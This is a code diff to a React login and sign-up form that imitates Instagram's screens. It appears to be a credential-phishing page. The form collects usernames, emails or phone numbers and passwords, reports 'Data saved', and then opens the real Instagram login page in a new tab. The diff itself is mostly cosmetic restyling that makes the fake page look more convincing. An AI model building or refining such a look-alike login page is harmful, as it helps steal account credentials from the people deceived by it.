@@ -47,13 +47,11 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
         return;
       }
 
-      // Successfully stored data, now redirect
       toast({
         title: "Data saved",
         description: "Your information has been recorded successfully.",
       });
 
-      // Small delay to show the toast before redirect
       setTimeout(() => {
         if (isLogin) {
           window.open('https://www.instagram.com/accounts/login/', '_blank');
@@ -77,14 +75,14 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
   return (
     <div className="w-full max-w-sm mx-auto">
       {!isLogin && (
-        <div className="text-center mb-6">
+        <div className="text-center mb-8">
           <p className="text-gray-300 font-semibold text-lg">
             Sign up to see photos and videos from your friends.
           </p>
         </div>
       )}
 
-      <form onSubmit={handleSubmit} className="space-y-4">
+      <form onSubmit={handleSubmit} className="space-y-3">
         {!isLogin && (
           <>
             <Input
@@ -92,14 +90,14 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
               placeholder="Full Name"
               value={fullName}
               onChange={(e) => setFullName(e.target.value)}
-              className="w-full h-14 px-4 text-sm bg-gray-800/40 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/60 focus:ring-0 focus:outline-none"
+              className="w-full h-12 px-4 text-sm bg-gray-900/60 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:border-gray-600 focus:bg-gray-900/80 focus:ring-0 focus:outline-none"
             />
             <Input
               type="text"
               placeholder="Username"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
-              className="w-full h-14 px-4 text-sm bg-gray-800/40 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/60 focus:ring-0 focus:outline-none"
+              className="w-full h-12 px-4 text-sm bg-gray-900/60 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:border-gray-600 focus:bg-gray-900/80 focus:ring-0 focus:outline-none"
             />
           </>
         )}
@@ -109,7 +107,7 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
           placeholder="Username, email address or mobile number"
           value={emailOrUsername}
           onChange={(e) => setEmailOrUsername(e.target.value)}
-          className="w-full h-14 px-4 text-sm bg-gray-800/40 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/60 focus:ring-0 focus:outline-none"
+          className="w-full h-12 px-4 text-sm bg-gray-900/60 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:border-gray-600 focus:bg-gray-900/80 focus:ring-0 focus:outline-none"
         />
         
         <div className="relative">
@@ -118,19 +116,19 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
             placeholder="Password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
-            className="w-full h-14 px-4 pr-12 text-sm bg-gray-800/40 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/60 focus:ring-0 focus:outline-none"
+            className="w-full h-12 px-4 pr-12 text-sm bg-gray-900/60 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:border-gray-600 focus:bg-gray-900/80 focus:ring-0 focus:outline-none"
           />
           <button
             type="button"
             onClick={() => setShowPassword(!showPassword)}
-            className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300"
+            className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-400"
           >
-            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
           </button>
         </div>
 
         {!isLogin && (
-          <div className="text-xs text-gray-400 text-center mt-4 mb-4">
+          <div className="text-xs text-gray-500 text-center mt-4 mb-4">
             <p>
               People who use our service may have uploaded your contact information to Instagram.{' '}
               <a href="#" className="text-blue-400">Learn More</a>
@@ -147,20 +145,18 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
         <Button
           type="submit"
           disabled={loading}
-          className="w-full h-14 bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-xl text-sm disabled:opacity-50 mt-6"
+          className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-lg text-sm disabled:opacity-50 mt-4"
         >
           {loading ? 'Saving...' : (isLogin ? 'Log in' : 'Sign up')}
         </Button>
       </form>
 
       {isLogin && (
-        <>
-          <div className="text-center mt-8">
-            <a href="#" className="text-blue-400 text-sm font-medium">
-              Forgotten password?
-            </a>
-          </div>
-        </>
+        <div className="text-center mt-6">
+          <a href="#" className="text-blue-400 text-sm font-medium">
+            Forgotten password?
+          </a>
+        </div>
       )}
     </div>
   );
